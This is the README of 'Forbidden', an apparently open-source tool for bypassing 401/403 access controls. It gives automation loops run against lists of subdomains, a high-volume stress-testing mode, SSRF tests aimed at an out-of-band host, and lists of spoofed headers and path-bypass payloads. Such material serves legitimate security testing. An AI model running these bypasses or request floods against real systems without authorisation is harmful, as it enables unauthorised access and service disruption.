# Forbidden

Bypass 4xx HTTP response status codes and more. Based on PycURL and Python Requests.

Script uses multithreading and is based on brute forcing, and as such, might have false positive results. Script has colored output.

Results will be sorted by HTTP response status code ascending, HTTP response content length descending, and ID ascending.

To manually filter out false positive results, for each unique HTTP response content length, run the provided `cURL` command and check if the HTTP response results in bypass; if not, simply ignore all the results with the same HTTP response content length.

| Description | Test |
| --- | --- |
| HTTP and HTTPS requests on both, domain name and IP. | base |
| HTTP methods + w/ `Content-Length: 0` HTTP request header. | methods |
| Cross-site tracing (XST) w/ HTTP TRACE and TRACK methods. | methods |
| \[Text\] file upload w/ HTTP PUT method. | methods |
| HTTP method overrides w/ HTTP request headers and URL query string params. | method-overrides |
| URL scheme overrides. | scheme-overrides |
| Port overrides. | port-overrides |
| Information disclosure w/ `Accept` HTTP request header. | headers |
| HTTP request headers. | headers |
| URL override + w/ accessible URL. | headers |
| HTTP host override w/ double `Host` HTTP request headers. | headers |
| URL path bypasses. | paths |
| URL transformations and encodings. | encodings |
| Basic and bearer auth + w/ null session and malicious JWTs. | base |
| Open redirect, OOB, and SSRF - HTTP request headers only. | redirects |
| Broken URL parsers. | parsers |

---

Check the stress testing script [here](https://github.com/ivan-sincek/forbidden/blob/main/src/stresser/stresser.py). Inspired by this [write-up](https://amineaboud.medium.com/story-of-a-weird-vulnerability-i-found-on-facebook-fc0875eb5125).

Extend the scripts to your liking.

Good sources of HTTP headers:

* [developer.mozilla.org/en-US/docs/Web/HTTP/Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
* [developers.cloudflare.com/fundamentals/reference/http-request-headers](https://developers.cloudflare.com/fundamentals/reference/http-request-headers)
* [udger.com/resources/http-request-headers](https://udger.com/resources/http-request-headers)
* [webconcepts.info/concepts/http-header](https://webconcepts.info/concepts/http-header)
* [webtechsurvey.com/common-response-headers](https://webtechsurvey.com/common-response-headers)

Tested on Kali Linux v2023.3 (64-bit).

Made for educational purposes. I hope it will help!

---

**Python Requests seems to be up to three times faster compared to PycURL, but PycURL is way more customizable.**

**Remarks:**

* average time to process around `6000` requests on `5` threads is around `7` minutes,
* beware of `rate limiting` and other similar anti-bot protections, take some time before you run the script again on the same domain,
* connection timeout is set to `60` seconds, and read/response timeout is set to `90` seconds,
* `length` attribute in results includes only HTTP response body length,
* testing `double headers` is locked to Python Requests because `cURL` does not support it,
* testing `encodings` is locked to `curl` because Python Requests does not support it,
* some web proxies might normalize URLs (e.g. when testing `encodings`),
* some web proxies might modify HTTP requests or drop them entirely,
* some websites might require a valid or very specific `User-Agent` HTTP request header,
* cross-site tracing (XST) is `no longer` considered to be a vulnerability.

**High priority plans:**

* use brute forcing to find allowed HTTP methods if HTTP OPTIONS method is not allowed,
* test HTTP cookies, `User-Agent` HTTP request header, CRLF, Log4j,
* add more path bypasses.

**Low priority plans:**

* table output to make results more readable and take less screen space,
* add option to test custom HTTP header-value pairs for a list of domains/subdomains.

## Table of Contents

* [How to Install](#how-to-install)
* [How to Build and Install Manually](#how-to-build-and-install-manually)
* [Automation](#automation)
* [HTTP Methods](#http-methods)
* [HTTP Request Headers](#http-headers)
* [URL Paths](#url-paths)
* [Results Format](#results-format)
* [Usage](#usage)
* [Images](#images)

## How to Install

On Windows OS, download and install PycURL from [www.lfd.uci.edu/~gohlke](https://www.lfd.uci.edu/~gohlke/pythonlibs/#pycurl).

```bash
apt-get -y install libcurl4-gnutls-dev librtmp-dev

pip3 install forbidden

pip3 install --upgrade forbidden
```

## How to Build and Install Manually

On Windows OS, download and install PycURL from [www.lfd.uci.edu/~gohlke](https://www.lfd.uci.edu/~gohlke/pythonlibs/#pycurl).

Run the following commands:

```bash
apt-get -y install libcurl4-gnutls-dev librtmp-dev

git clone https://github.com/ivan-sincek/forbidden && cd forbidden

python3 -m pip install --upgrade build

python3 -m build

python3 -m pip install dist/forbidden-9.8-py3-none-any.whl
```

## Automation

Bypass `403 Forbidden` HTTP response status code:

```bash
count=0; for subdomain in $(cat subdomains_403.txt); do count=$((count+1)); echo "#${count} | ${subdomain}"; forbidden -u "${subdomain}" -t base,methods,method-overrides,scheme-overrides,port-overrides,headers,paths,encodings -f GET -l base,path -o "forbidden_403_results_${count}.json"; done
```

Bypass `403 Forbidden` HTTP response status code with stress testing:

```bash
mkdir stresser_403_results

count=0; for subdomain in $(cat subdomains_403.txt); do count=$((count+1)); echo "#${count} | ${subdomain}"; stresser -u "${subdomain}" -dir stresser_403_results -ic yes -r 1000 -th 200 -f GET -l base -o "stresser_403_results_${count}.json"; done
```

Bypass `401 Unauthorized` HTTP response status code:

```bash
count=0; for subdomain in $(cat subdomains_401.txt); do count=$((count+1)); echo "#${count} | ${subdomain}"; forbidden -u "${subdomain}" -t auths -f GET -l base -o "forbidden_401_results_${count}.json"; done
```

Test open redirects and server-side request forgery (SSRF):

```bash
count=0; for subdomain in $(cat subdomains_live_long.txt); do count=$((count+1)); echo "#${count} | ${subdomain}"; forbidden -u "${subdomain}" -t redirects -f GET -l base -e xyz.interact.sh -o "forbidden_redirect_results_${count}.json"; done
```

Test broken URL parsers:

```bash
count=0; for subdomain in $(cat subdomains_live_long.txt); do count=$((count+1)); echo "#${count} | ${subdomain}"; forbidden -u "${subdomain}" -t parsers -f GET -l base -e xyz.interact.sh -o "forbidden_parser_results_${count}.json"; done
```

# HTTP Methods

```fundamental
ACL
ARBITRARY
BASELINE-CONTROL
BIND
CHECKIN
CHECKOUT
CONNECT
COPY
GET
HEAD
INDEX
LABEL
LINK
LOCK
MERGE
MKACTIVITY
MKCALENDAR
MKCOL
MKREDIRECTREF
MKWORKSPACE
MOVE
OPTIONS
ORDERPATCH
PATCH
POST
PRI
PROPFIND
PROPPATCH
PUT
REBIND
REPORT
SEARCH
SHOWMETHOD
SPACEJUMP
TEXTSEARCH
TRACE
TRACK
UNBIND
UNCHECKOUT
UNLINK
UNLOCK
UPDATE
UPDATEREDIRECTREF
VERSION-CONTROL
```

# HTTP Request Headers

Method overrides:

```fundamental
X-HTTP-Method
X-HTTP-Method-Override
X-Method-Override
```

Scheme overrides:

```fundamental
X-Forwarded-Proto
X-Forwarded-Protocol
X-Forwarded-Scheme
X-Scheme
X-URL-Scheme
```

Port overrides:

```fundamental
X-Forwarded-Port
```

Other:

```fundamental
19-Profile
Base-URL
CF-Connecting-IP
Client-IP
Cluster-Client-IP
Destination
Forwarded
Forwarded-For
Forwarded-For-IP
From
Host
Incap-Client-IP
Origin
Profile
Proxy
Redirect
Referer
Remote-Addr
Request-URI
True-Client-IP
URI
URL
WAP-Profile
X-Client-IP
X-Cluster-Client-IP
X-Custom-IP-Authorization
X-Forwarded
X-Forwarded-By
X-Forwarded-For
X-Forwarded-For-Original
X-Forwarded-Host
X-Forwarded-Path
X-Forwarded-Server
X-HTTP-DestinationURL
X-HTTP-Host-Override
X-Host
X-Host-Override
X-Original-Forwarded-For
X-Original-Remote-Addr
X-Original-URL
X-Originally-Forwarded-For
X-Originating-IP
X-Override-URL
X-Proxy-Host
X-Proxy-URL
X-ProxyUser-IP
X-Real-IP
X-Referer
X-Remote-Addr
X-Remote-IP
X-Requested-With
X-Rewrite-URL
X-Server-IP
X-True-Client-IP
X-True-IP
X-Wap-Profile
```

# URL Paths

Inject at the beginning, end, and both, beginning and end of the URL path. All possible combinations.

```fundamental
/
//
%09
%20
%23
%2e
*
.
..
;
.;
..;
;foo=bar;
```

Inject at the end of the URL path.

```fundamental
#
##
##random
*
**
**random
.
..
..random
?
??
??random
~
~~
~~random
```

Inject at the end of the URL path only if it does not end with forward slash.

```fundamental
.asp
.aspx
.esp
.html
.jhtml
.json
.jsp
.jspa
.jspx
.php
.sht
.shtml
.xhtml
.xml
```

## Results Format

```json
[
    {
        "id": "860-HEADERS-3",
        "url": "https://github.com:443/test",
        "method": "GET",
        "headers": [
            "Host: 127.0.0.1"
        ],
        "body": null,
        "agent": "Forbidden/9.8",
        "command": "curl --connect-timeout '60' -m '90' -iskL --max-redirs '10' --path-as-is -A 'Forbidden/9.8' -H 'Host: 127.0.0.1' -X 'GET' 'https://github.com:443/test'",
        "code": 200,
        "length": 255408
    },
    {
        "id": "861-HEADERS-3",
        "url": "https://github.com:443/test",
        "method": "GET",
        "headers": [
            "Host: 127.0.0.1:443"
        ],
        "body": null,
        "agent": "Forbidden/9.8",
        "command": "curl --connect-timeout '60' -m '90' -iskL --max-redirs '10' --path-as-is -A 'Forbidden/9.8' -H 'Host: 127.0.0.1:443' -X 'GET' 'https://github.com:443/test'",
        "code": 200,
        "length": 255408
    }
]
```

## Usage

```fundamental
Forbidden v9.8 ( github.com/ivan-sincek/forbidden )

Usage:   forbidden -u url                       -t tests [-f force] [-v values    ] [-p path ] [-o out         ]
Example: forbidden -u https://example.com/admin -t all   [-f POST ] [-v values.txt] [-p /home] [-o results.json]

DESCRIPTION
    Bypass 4xx HTTP response status codes and more
URL
    Inaccessible URL
    -u <url> - https://example.com/admin | etc.
IGNORE QSF
    Ignore URL query string and fragment
    -iqsf <ignore-qsf> - yes
IGNORE CURL
    Use Python Requests instead of PycURL
    -ic <ignore-curl> - yes
TESTS
    Tests to run
    Use a comma-separated values
    -t <tests> - base | methods | [method|scheme|port]-overrides | headers | paths | encodings | auths | redirects | parsers | all
FORCE
    Force an HTTP method for all non-specific test cases
    -f <force> - GET | POST | CUSTOM | etc.
VALUES
    File with additional HTTP request header values such as internal IPs, etc.
    Spacing will be stripped, empty lines ignored, and duplicates removed
    Tests: headers
    -v <values> - values.txt | etc.
PATH
    Accessible URL path to test URL overrides
    Tests: headers
    Default: /robots.txt | /index.html | sitemap.xml
    -p <path> - /home | /README.txt | etc.
EVIL
    Evil URL to test URL overrides
    Tests: headers | redirects
    Default: https://github.com
    -e <evil> - https://xyz.interact.sh | https://xyz.burpcollaborator.net | etc.
IGNORE
    Filter out 200 OK false positive results with RegEx
    Spacing will be stripped
    -i <ignore> - Inaccessible | "Access Denied" | etc.
LENGTHS
    Filter out 200 OK false positive results by HTTP response content lengths
    Specify 'base' to ignore content length of the base HTTP response
    Specify 'path' to ignore content length of the accessible URL response
    Use comma-separated values
    -l <lengths> - 12 | base | path | etc.
THREADS
    Number of parallel threads to run
    More threads make it run faster but also might return more false positive results
    Greatly impacted by internet connectivity speed and server capacity
    Default: 5
    -th <threads> - 20 | etc.
SLEEP
    Sleep before sending an HTTP request
    Intended for a single-thread use
    -s <sleep> - 5 | etc.
AGENT
    User agent to use
    Default: Forbidden/9.8
    -a <agent> - curl/3.30.1 | random[-all] | etc.
PROXY
    Web proxy to use
    -x <proxy> - http://127.0.0.1:8080 | etc.
OUT
    Output file
    -o <out> - results.json | etc.
DEBUG
    Debug output
    -dbg <debug> - yes
```

```fundamental
Stresser v9.8 ( github.com/ivan-sincek/forbidden )

Usage:   stresser -u url                       -u url                        -dir directory -r repeat -th threads [-f force] [-o out         ]
Example: stresser -u https://example.com/admin -u https://example.com/secret -dir results   -r 1000   -th 200     [-f GET  ] [-o results.json]

DESCRIPTION
    Bypass 4xx HTTP response status codes with stress testing
URL
    Inaccessible URL
    -u <url> - https://example.com/admin | etc.
IGNORE QSF
    Ignore URL query string and fragment
    -iqsf <ignore-qsf> - yes
IGNORE CURL
    Use Python Requests instead of PycURL
    -ic <ignore-curl> - yes
FORCE
    Force an HTTP method for all non-specific test cases
    -f <force> - GET | POST | CUSTOM | etc.
IGNORE
    Filter out 200 OK false positive results with RegEx
    Spacing will be stripped
    -i <ignore> - Inaccessible | "Access Denied" | etc.
LENGTHS
    Filter out 200 OK false positive results by HTTP response content lengths
    Specify 'base' to ignore content length of the base HTTP response
    Use comma-separated values
    -l <lengths> - 12 | base | etc.
REPEAT
    Number of total HTTP requests to send for each test case
    -r <repeat> - 1000 | etc.
THREADS
    Number of parallel threads to run
    -th <threads> - 200 | etc.
AGENT
    User agent to use
    Default: Stresser/9.8
    -a <agent> - curl/3.30.1 | random[-all] | etc.
PROXY
    Web proxy to use
    -x <proxy> - http://127.0.0.1:8080 | etc.
OUT
    Output file
    -o <out> - results.json | etc.
DIRECTORY
    Output directory
    All valid and unique HTTP responses will be saved in this directory
    -dir <directory> - results | etc.
DEBUG
    Debug output
    -dbg <debug> - yes
```

## Images

<p align="center"><img src="https://raw.githubusercontent.com/ivan-sincek/forbidden/main/img/basic_example.png" alt="Basic Example"></p>

<p align="center">Figure 1 - Basic Example</p>
